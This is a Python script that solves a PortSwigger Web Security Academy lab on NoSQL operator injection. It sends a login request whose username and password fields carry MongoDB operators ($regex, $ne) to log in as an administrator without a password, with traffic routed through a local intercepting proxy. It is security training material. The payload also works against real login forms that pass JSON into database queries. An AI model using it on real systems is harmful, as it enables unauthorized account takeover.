# Exploiting NoSQL operator injection to bypass authentication

# https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import string
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def connect_as_admin(s, url):
	print('\n[+] Trying to log in as Administrator')
	login_path = url + '/login'
	login_data = {
	"username": {"$regex": "admin.*"},
	"password": {"$ne": ""}
	}
	print(f'JSON payload:\n\t{login_data}')
	r = s.post(login_path, json=login_data)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting NoSQL operator injection to bypass authentication')
	parser = argparse.ArgumentParser(description="[+] Lab: Exploiting NoSQL operator injection to bypass authentication")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("[+] Trying to bypass authentication...\n")
			time.sleep(1)

			connect_as_admin(s, url)

			s.cookies.clear()
			s.headers.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()

